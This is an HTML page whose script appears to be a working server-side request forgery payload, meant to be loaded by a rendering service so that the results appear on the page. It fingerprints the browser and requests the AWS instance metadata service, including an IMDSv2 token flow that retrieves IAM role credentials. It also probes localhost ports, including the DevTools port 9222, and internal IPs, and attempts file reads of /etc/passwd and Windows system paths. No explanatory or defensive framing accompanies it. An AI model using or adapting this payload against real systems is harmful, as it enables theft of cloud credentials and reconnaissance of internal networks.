<!DOCTYPE html>
<html>
<head><title>T</title><style>
body{font:10px monospace;word-break:break-all}
.r{background:#eee;margin:2px;padding:2px}
</style></head>
<body>
<div id="o"></div>
<script>
var O=document.getElementById("o");
function log(t,d){
    var p=document.createElement("div");
    p.className="r";
    p.textContent="["+t+"] "+(d||"");
    O.appendChild(p);
}

log("ua", navigator.userAgent);
log("plat", navigator.platform);
log("lang", navigator.language);
log("screen", screen.width+"x"+screen.height);
log("loc", location.href);
try{log("hwc", navigator.hardwareConcurrency);}catch(e){}

// XHR helper - writes response to page
function xhr(tag, url, timeout){
    var x=new XMLHttpRequest();
    x.open("GET",url,true);
    x.timeout=timeout||5000;
    x.onload=function(){log(tag+"-OK",x.status+": "+x.responseText.substring(0,500));};
    x.onerror=function(){log(tag+"-ERR","onerror");};
    x.ontimeout=function(){log(tag+"-TOUT","timeout");};
    x.onabort=function(){log(tag+"-ABORT","abort");};
    try{x.send();log(tag+"-SENT","");}
    catch(e){log(tag+"-EXC",e.message);}
}

// Metadata - try both HTTP and HTTPS
xhr("meta-h", "http://169.254.169.254/latest/meta-data/", 4000);
xhr("meta-s", "https://169.254.169.254/latest/meta-data/", 4000);
xhr("meta-iam", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", 4000);
xhr("meta-id", "http://169.254.169.254/latest/dynamic/instance-identity/document", 4000);
xhr("meta-ud", "http://169.254.169.254/latest/user-data", 4000);
xhr("meta-host", "http://169.254.169.254/latest/meta-data/hostname", 4000);

// IMDSv2 with token
var tx=new XMLHttpRequest();
tx.open("PUT","http://169.254.169.254/latest/api/token",true);
tx.setRequestHeader("X-aws-ec2-metadata-token-ttl-seconds","21600");
tx.timeout=4000;
tx.onload=function(){
    var tok=tx.responseText;
    log("imdsv2-tok",tok.substring(0,100));
    // Use token for requests
    var x2=new XMLHttpRequest();
    x2.open("GET","http://169.254.169.254/latest/meta-data/iam/security-credentials/",true);
    x2.setRequestHeader("X-aws-ec2-metadata-token",tok);
    x2.onload=function(){
        log("imdsv2-iam",x2.responseText.substring(0,500));
        // Get the role credentials
        var role=x2.responseText.trim().split("\n")[0];
        if(role){
            var x3=new XMLHttpRequest();
            x3.open("GET","http://169.254.169.254/latest/meta-data/iam/security-credentials/"+role,true);
            x3.setRequestHeader("X-aws-ec2-metadata-token",tok);
            x3.onload=function(){log("imdsv2-creds",x3.responseText.substring(0,500));};
            x3.send();
        }
    };
    x2.send();
};
tx.onerror=function(){log("imdsv2-ERR","onerror");};
tx.ontimeout=function(){log("imdsv2-TOUT","timeout");};
try{tx.send();}catch(e){log("imdsv2-EXC",e.message);}

// Localhost services
xhr("local-80", "http://localhost:80/", 3000);
xhr("local-4000", "http://localhost:4000/", 3000);
xhr("local-8080", "http://localhost:8080/", 3000);
xhr("local-3000", "http://localhost:3000/", 3000);
xhr("local-9222", "http://localhost:9222/json", 3000);

// Internal IPs
xhr("ip-10.0.0.1", "http://10.0.0.1/", 3000);
xhr("ip-172.17.0.1", "http://172.17.0.1/", 3000);

// File access
xhr("file-hosts", "file:///C:/Windows/System32/drivers/etc/hosts", 3000);
xhr("file-passwd", "file:///etc/passwd", 3000);
xhr("file-hostname", "file:///etc/hostname", 3000);

// Windows specific
xhr("win-env", "file:///C:/Users/", 3000);

// DNS resolution test
xhr("dns-test", "http://whatismyip.akamai.com/", 3000);

// Final status
setTimeout(function(){
    log("DONE", O.children.length+" entries");
}, 12000);
</script>
</body>
</html>
